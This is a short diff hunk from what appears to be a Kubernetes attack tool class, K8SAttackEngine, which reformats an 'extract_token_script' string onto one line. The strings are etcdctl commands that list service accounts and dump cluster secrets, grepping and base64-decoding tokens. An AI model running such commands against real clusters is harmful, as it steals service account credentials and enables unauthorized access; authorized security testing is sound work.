@@ -243,8 +243,7 @@ class K8SAttackEngine:
                 "ETCDCTL_API=3 etcdctl get /registry/serviceaccounts/ --prefix --keys-only",
             ],
             "extract_token_script": (
-                "ETCDCTL_API=3 etcdctl get /registry/secrets/ --prefix | "
-                "grep -a 'token' | base64 -d"
+                "ETCDCTL_API=3 etcdctl get /registry/secrets/ --prefix | grep -a 'token' | base64 -d"
             ),
         }
 
